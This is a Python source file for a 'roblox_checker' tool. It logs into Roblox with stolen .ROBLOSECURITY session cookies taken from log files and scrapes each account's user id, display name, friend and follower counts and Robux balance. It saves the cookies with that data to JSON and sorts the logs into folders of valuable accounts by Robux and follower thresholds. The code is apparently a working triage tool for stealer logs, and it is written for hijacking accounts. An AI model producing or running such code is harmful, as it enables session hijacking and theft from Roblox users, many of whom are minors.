# -*- coding: utf-8 -*-
import StandartMethod
import re
import random
import time
import requests
from bs4 import BeautifulSoup
import lxml
import os
import sys
import json
import shutil
class roblox_checker():


    @staticmethod
    def create_file(create_path: str, cook: str, path: str, user_id: str, nick: str, friendscount: str, followerscount: str, followingscount: str, robux:str, file: str):
        nick = StandartMethod.StandartMetod.validate(nick)
        dir_path = create_path+f"\\{nick} ROBUX({robux}) - Frinds({friendscount}) - Followers({followerscount})"
        try:
            os.mkdir(dir_path)
        except OSError as error:
            pass
        data = {
            'Path': path,
            'Cookie': cook,
            'Account Info': {
                'Nick': nick,
                'User-id': user_id,
                'Robux': robux,
                'Friends-count': friendscount,
                'Followers-count': followerscount,
                'Followings-count': followingscount,
            }
        }
        with open(f'{dir_path}\\MainInfo.json', 'w', encoding='utf-8') as outfile:
            json.dump(data, outfile, indent=4, ensure_ascii=False)
        shutil.copy(f'{file}\\{path}', f'{dir_path}\\{path}')

        settings = StandartMethod.headless.get_settings()['Filter_settings']['Roblox']

        try:
            os.mkdir(f'{create_path}\\{settings["Full_log"]}')
        except:
            pass
        try:
            os.mkdir(f'{create_path}\\{settings["Robux_path"]}')
        except:
            pass

        path_premium_log = f'{create_path}\\{settings["Robux_path"]}\\{nick} ROBUX({robux}) - Frinds({friendscount}) - Followers({followerscount})'
        if int(settings['Filter_robux']) <= int(robux):
            try:
                os.mkdir(path_premium_log)
            except:
                pass
            with open(f'{path_premium_log}\\MainInfo.json', 'w', encoding='utf-8') as outfile:
                json.dump(data, outfile, indent=4, ensure_ascii=False)
            shutil.copy(f'{file}\\{path}', f'{path_premium_log}\\{path}')

        try:
            os.mkdir(f'{create_path}\\{settings["Followers_path"]}')
        except:
            pass

        path_premium_log = f'{create_path}\\{settings["Followers_path"]}\\{nick} ROBUX({robux}) - Frinds({friendscount}) - Followers({followerscount})'
        if int(settings['Filter_followers']) <= int(followerscount):
            try:
                os.mkdir(path_premium_log)
            except:
                pass
            with open(f'{path_premium_log}\\MainInfo.json', 'w', encoding='utf-8') as outfile:
                json.dump(data, outfile, indent=4, ensure_ascii=False)
            shutil.copy(f'{file}\\{path}', f'{path_premium_log}\\{path}')
        shutil.copy(f'{file}\\{path}', f'{create_path}\\{settings["Full_log"]}\\{path}')
    @staticmethod
    def checker(dict, account, path_log, file):
        headers = StandartMethod.StandartMetod.get_headers()
        cook = {
            ".ROBLOSECURITY": account['.ROBLOSECURITY'],
        }
        s = requests.Session()
        req = s.get('https://www.roblox.com/home', headers=headers, cookies=cook)
        try:
            user_id = re.findall(r"data-userid=\"(.*?)\"", req.text)[0].strip()
            req = s.get(f'https://www.roblox.com/users/{user_id}/profile', cookies=cook, headers=headers)
            nick = re.findall(r"data-displayName=\"(.*?)\"", req.text)[0].strip()
            friendscount = re.findall(r"data-friendscount=\"(.*?)\"", req.text)[0].strip()
            followerscount = re.findall(r"data-followerscount=\"(.*?)\"", req.text)[0].strip()
            followingscount = re.findall(r"data-followingscount=\"(.*?)\"", req.text)[0].strip()
            req = s.get(f'https://economy.roblox.com/v1/users/{user_id}/currency', headers=headers, cookies=cook)
            robux = req.json()['robux']
            roblox_checker.create_file(f'{dict}',account['.ROBLOSECURITY'], path_log , user_id, nick, friendscount, followerscount, followingscount, robux, file)
        except Exception as ex:
            pass